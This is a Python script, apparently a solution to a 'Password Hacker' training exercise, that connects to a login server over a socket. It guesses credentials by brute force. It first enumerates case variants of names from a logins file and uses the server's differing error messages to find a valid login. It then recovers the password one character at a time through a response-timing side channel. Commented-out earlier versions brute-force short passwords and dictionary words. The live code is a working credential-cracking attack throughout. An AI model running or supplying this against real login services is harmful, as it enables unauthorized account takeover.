import argparse
import socket
import string
import itertools
import json
from math import factorial
import os
import time
path = os.getcwd() + "\\passwords.txt"

def brute_force(my_sock):
    """ Attempts to hack the server, using brute force to discover login/password

    Arguments:
    my_sock -- connection with the server socket
    Return json message with correct login and password
    """

    # on this version of the code, there is no need to login. The password is a small word and all combinations are
    # tested
    # chars = string.ascii_lower + string.digits
    # word_sizes = [1, 2, 3, 4, 5]
    # for word_size in word_sizes:
    #     iter_letters = itertools.product(chars, repeat=word_size)
    #     for i in range(len(chars) ** word_size):
    #         password = "".join(next(iter_letters))
    #         password_enc = password.encode()
    #         my_sock.send(password_enc)
    #         response = my_sock.recv(1024)
    #         if response.decode() == "Connection success!":
    #             return password
    #         elif response.decode() == "Wrong password!":
    #             pass

    # on this version of the code, there is no need to login. The password is on a list password.txt. All passwords and
    # variations with lower and upper cases are attempted
    # with open("C:\\Users\\lpdaj\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\passwords.txt", "r", encoding="utf-8") as f:
    #     for password in f:
    #         password = password.strip('\n')
    #         password_enc = password.encode()
    #         my_sock.send(password_enc)
    #         response = my_sock.recv(1024)
    #         if response.decode() == "Connection success!":
    #             return password
    #         elif response.decode() == "Wrong password!":
    #             pass
    #
    #         for i in range(1, len(password) + 1):
    #             iter = itertools.combinations(password, i)
    #             for _ in range(int(factorial(len(password)) / (factorial(i) * factorial(len(password) - i)))):
    #                 letters = next(iter)
    #                 word = password
    #                 for letter in letters:
    #                     word = word.replace(letter, letter.upper())
    #                 password_enc = word.encode()
    #                 my_sock.send(password_enc)
    #                 response = my_sock.recv(1024)
    #                 if response.decode() == "Connection success!":
    #                     return word
    #                 elif response.decode() == "Wrong password!":
    #                     pass

    # the login is on a document logins.txt
    with open("C:\\Users\\lpdaj\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\logins.txt", "r", encoding="utf-8") as f:
        # iterate over the logins.txt and remove the line breaker
        for candidate_login in f:
            candidate_login = candidate_login.strip('\n')
            # create iterator with all combinations of the login with lower and upper cases
            iter = map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in candidate_login)))
            # to discover the login, first the password is sent blank
            for _ in range(2**len(candidate_login)):
                login = next(iter)
                access = {"login": login, "password": " "}
                # the access dictionary will be sent as a json string converted to bytes.
                access_json = json.dumps(access)
                my_sock.send(access_json.encode())
                response = json.loads(my_sock.recv(1024).decode())
                # when response is "Wrong password!", the login was obtained
                if response["result"] == "Wrong password!":
                    correct_login = login
                    break
                elif response["result"] == "Wrong login!":
                    pass

        chars = string.ascii_letters + string.digits
        correct_password = ""
        while True:
            # to discover the password, it's attempted the first letter with all possibilities a, b... A, B...0,1...
            # when the delay between attempt and response is greater than 0.01s, it means that this letter is correct
            # then it keeps trying with the second letter and so on until "Connection success!" is responded by the
            # server
            iter_1_letter = itertools.combinations(chars, 1)
            for i in range(len(chars)):
                password = correct_password + next(iter_1_letter)[0]
                access = {"login": correct_login, "password": password}
                access_json = json.dumps(access)
                start_time = time.perf_counter()
                my_sock.send(access_json.encode())
                response = json.loads(my_sock.recv(1024).decode())
                end_time = time.perf_counter()
                delay = end_time - start_time
                # if response["result"] == "Exception happened during login":
                #     correct_password = password
                #     break
                if response["result"] == "Wrong password!":
                    if delay > 0.01:
                        correct_password = password
                        break
                    else:
                        pass
                elif response["result"] == "Connection success!":
                    return json.dumps({"login": correct_login, "password": password})


def main():
    """Input localhost and port and calls brute_force function to discover the login/password.
    
    Example:
    python hack.py localhost 9090
    """
    # use argparse to get the user input
    parser = argparse.ArgumentParser(description="""User should enter the hostname and port number""")
    parser.add_argument("hostname")
    parser.add_argument("port", type=int)
    # parser.add_argument("password")
    args = parser.parse_args()

    hostname = args.hostname
    port = args.port
    # password = args.password

    # create socket and connect to server
    with socket.socket() as my_sock:
        address = (hostname, port)
        my_sock.connect(address)
        print(brute_force(my_sock))
    # password = password.encode()
    # my_sock.send(password)
    # response = my_sock.recv(1024)
    # print(response.decode())

if __name__ == "__main__":
    main()
